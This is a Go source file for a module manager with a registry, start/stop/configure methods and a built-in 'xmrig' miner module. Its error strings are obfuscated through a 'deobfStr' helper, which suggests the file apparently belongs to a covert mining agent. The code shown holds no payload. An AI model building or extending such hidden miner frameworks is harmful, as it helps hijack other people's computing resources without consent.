package main

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"
)

// ModuleStatus represents the current status of a module
type ModuleStatus int

const (
	ModuleStatusUnloaded ModuleStatus = iota
	ModuleStatusLoaded
	ModuleStatusRunning
	ModuleStatusStopped
	ModuleStatusError
)

func (ms ModuleStatus) String() string {
	switch ms {
	case ModuleStatusUnloaded:
		return "unloaded"
	case ModuleStatusLoaded:
		return "loaded"
	case ModuleStatusRunning:
		return "running"
	case ModuleStatusStopped:
		return "stopped"
	case ModuleStatusError:
		return "error"
	default:
		return "unknown"
	}
}

// ModuleInfo contains information about a module
type ModuleInfo struct {
	Name        string       `json:"name"`
	Description string       `json:"description"`
	Version     string       `json:"version"`
	Status      ModuleStatus `json:"status"`
	LoadedAt    time.Time    `json:"loaded_at"`
	StartedAt   time.Time    `json:"started_at"`
	LastError   string       `json:"last_error,omitempty"`
}

// Module interface that all modules must implement
type Module interface {
	// GetInfo returns basic information about the module
	GetInfo() ModuleInfo

	// Load initializes the module with given parameters
	Load(params map[string]interface{}) error

	// Start begins module execution with given parameters
	Start(params map[string]interface{}) error

	// Stop halts module execution
	Stop() error

	// Configure updates module configuration
	Configure(config []byte) error

	// GetStatus returns detailed status information
	GetStatus() ([]byte, error)

	// IsRunning returns true if the module is currently running
	IsRunning() bool
}

// ModuleManager manages all loaded modules
type ModuleManager struct {
	modules map[string]Module
	mutex   sync.RWMutex
}

// NewModuleManager creates a new module manager
func NewModuleManager() *ModuleManager {
	return &ModuleManager{
		modules: make(map[string]Module),
	}
}

// RegisterModule registers a new module with the manager
func (mm *ModuleManager) RegisterModule(name string, module Module) error {
	mm.mutex.Lock()
	defer mm.mutex.Unlock()

	if _, exists := mm.modules[name]; exists {
		return fmt.Errorf(deobfStr("mod_exists"), name)
	}

	mm.modules[name] = module
	return nil
}

// LoadModule loads a module with given parameters
func (mm *ModuleManager) LoadModule(name string, params map[string]interface{}) error {
	mm.mutex.Lock()
	defer mm.mutex.Unlock()

	module, exists := mm.modules[name]
	if !exists {
		return fmt.Errorf(deobfStr("mod_not_found"), name)
	}

	return module.Load(params)
}

// StartModule starts a loaded module
func (mm *ModuleManager) StartModule(name string, params map[string]interface{}) error {
	mm.mutex.RLock()
	module, exists := mm.modules[name]
	mm.mutex.RUnlock()

	if !exists {
		return fmt.Errorf(deobfStr("mod_not_found"), name)
	}

	return module.Start(params)
}

// StopModule stops a running module
func (mm *ModuleManager) StopModule(name string) error {
	mm.mutex.RLock()
	module, exists := mm.modules[name]
	mm.mutex.RUnlock()

	if !exists {
		return fmt.Errorf(deobfStr("mod_not_found"), name)
	}

	return module.Stop()
}

// ConfigureModule configures a module
func (mm *ModuleManager) ConfigureModule(name string, config []byte) error {
	mm.mutex.RLock()
	module, exists := mm.modules[name]
	mm.mutex.RUnlock()

	if !exists {
		return fmt.Errorf(deobfStr("mod_not_found"), name)
	}

	return module.Configure(config)
}

// GetModuleStatus returns the status of a specific module
func (mm *ModuleManager) GetModuleStatus(name string) ([]byte, error) {
	mm.mutex.RLock()
	module, exists := mm.modules[name]
	mm.mutex.RUnlock()

	if !exists {
		return nil, fmt.Errorf("module %s not found", name)
	}

	return module.GetStatus()
}

// ListModules returns information about all registered modules
func (mm *ModuleManager) ListModules() ([]byte, error) {
	mm.mutex.RLock()
	defer mm.mutex.RUnlock()

	var moduleList []ModuleInfo
	for _, module := range mm.modules {
		moduleList = append(moduleList, module.GetInfo())
	}

	return json.Marshal(moduleList)
}

// GetModule returns a module by name (for internal use)
func (mm *ModuleManager) GetModule(name string) (Module, bool) {
	mm.mutex.RLock()
	defer mm.mutex.RUnlock()

	module, exists := mm.modules[name]
	return module, exists
}

// Global module manager instance
var moduleManager *ModuleManager

// InitModuleManager initializes the global module manager and registers built-in modules
func InitModuleManager() {
	moduleManager = NewModuleManager()

	// Register built-in modules
	xmrigModule := NewXMRigModule()
	moduleManager.RegisterModule("xmrig", xmrigModule)
}

// GetModuleManager returns the global module manager
func GetModuleManager() *ModuleManager {
	if moduleManager == nil {
		InitModuleManager()
	}
	return moduleManager
}
